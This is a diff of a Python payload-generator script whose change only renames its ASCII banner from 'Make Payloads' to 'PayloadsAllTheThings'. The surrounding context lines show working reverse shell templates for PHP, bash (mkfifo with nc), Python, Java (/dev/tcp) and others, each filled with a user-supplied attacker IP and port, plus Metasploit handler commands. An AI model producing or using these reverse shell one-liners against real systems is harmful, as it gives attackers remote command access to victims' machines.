@@ -3,13 +3,13 @@ import subprocess
 import pyfiglet
 import time
 os.system("clear")
-ascii_banner = pyfiglet.figlet_format("Make Payloads")
+ascii_banner = pyfiglet.figlet_format("PayloadsAllTheThings")
 print(ascii_banner)
 
 
 def Windows_Reverse_Shell():
     os.system("clear")
-    ascii_banner = pyfiglet.figlet_format("Make Payloads")
+    ascii_banner = pyfiglet.figlet_format("PayloadsAllTheThings")
     print(ascii_banner)
     print("\n\n")
     ipaddr = input("[-] Enter Your Ip : ")
@@ -43,7 +43,7 @@ exploit -j
 
 def Python_Reverse_Shell_msf():
     os.system("clear")
-    ascii_banner = pyfiglet.figlet_format("Make Payloads")
+    ascii_banner = pyfiglet.figlet_format("PayloadsAllTheThings")
     print(ascii_banner)
     print("\n\n")
     ipaddr = input("[-] Enter Your Ip : ")
@@ -77,7 +77,7 @@ exploit -j
 
 def Python3_Reverse_Shell():
     os.system("clear")
-    ascii_banner = pyfiglet.figlet_format("Make Payloads")
+    ascii_banner = pyfiglet.figlet_format("PayloadsAllTheThings")
     print(ascii_banner)
     print("\n\n")
     ipaddr = input("[-] Enter Your Ip : ")
@@ -97,7 +97,7 @@ python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREA
 
 def php_reverse_shell():
     os.system("clear")
-    ascii_banner = pyfiglet.figlet_format("Make Payloads")
+    ascii_banner = pyfiglet.figlet_format("PayloadsAllTheThings")
     print(ascii_banner)
     print("\n\n")
     ipaddr = input("[-] Enter Your Ip : ")
@@ -117,7 +117,7 @@ php -r '$sock=fsockopen("{ipaddr}",{port});$proc=proc_open("/bin/sh -i", array(0
 
 def bash_reverse_shell():
     os.system("clear")
-    ascii_banner = pyfiglet.figlet_format("Make Payloads")
+    ascii_banner = pyfiglet.figlet_format("PayloadsAllTheThings")
     print(ascii_banner)
     print("\n\n")
     ipaddr = input("[-] Enter Your Ip : ")
@@ -137,7 +137,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ipaddr} {port} >/tmp/f
 
 def powershell_reverse_shell():
     os.system("clear")
-    ascii_banner = pyfiglet.figlet_format("Make Payloads")
+    ascii_banner = pyfiglet.figlet_format("PayloadsAllTheThings")
     print(ascii_banner)
     print("\n\n")
     ipaddr = input("[-] Enter Your Ip : ")
@@ -156,7 +156,7 @@ def powershell_reverse_shell():
 
 def rubby_reverse_shell():
     os.system("clear")
-    ascii_banner = pyfiglet.figlet_format("Make Payloads")
+    ascii_banner = pyfiglet.figlet_format("PayloadsAllTheThings")
     print(ascii_banner)
     print("\n\n")
     ipaddr = input("[-] Enter Your Ip : ")
@@ -175,7 +175,7 @@ def rubby_reverse_shell():
 
 def java_reverse_shell():
     os.system("clear")
-    ascii_banner = pyfiglet.figlet_format("Make Payloads")
+    ascii_banner = pyfiglet.figlet_format("PayloadsAllTheThings")
     print(ascii_banner)
     print("\n\n")
     ipaddr = input("[-] Enter Your Ip : ")
@@ -194,7 +194,7 @@ Process p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/{ipaddr}/{port};cat <&5 | whi
 
 def golang_reverse_shell():
     os.system("clear")
-    ascii_banner = pyfiglet.figlet_format("Make Payloads")
+    ascii_banner = pyfiglet.figlet_format("PayloadsAllTheThings")
     print(ascii_banner)
     print("\n\n")
     ipaddr = input("[-] Enter Your Ip : ")
@@ -212,7 +212,7 @@ def golang_reverse_shell():
 
 def ncat_reverse_shell():
     os.system("clear")
-    ascii_banner = pyfiglet.figlet_format("Make Payloads")
+    ascii_banner = pyfiglet.figlet_format("PayloadsAllTheThings")
     print(ascii_banner)
     print("\n\n")
     ipaddr = input("[-] Enter Your Ip : ")
@@ -235,7 +235,7 @@ For Windows:
 
 def linux_reverse_tcp():
     os.system("clear")
-    ascii_banner = pyfiglet.figlet_format("Make Payloads")
+    ascii_banner = pyfiglet.figlet_format("PayloadsAllTheThings")
     print(ascii_banner)
     print("\n\n")
     ipaddr = input("[-] Enter Your Ip : ")
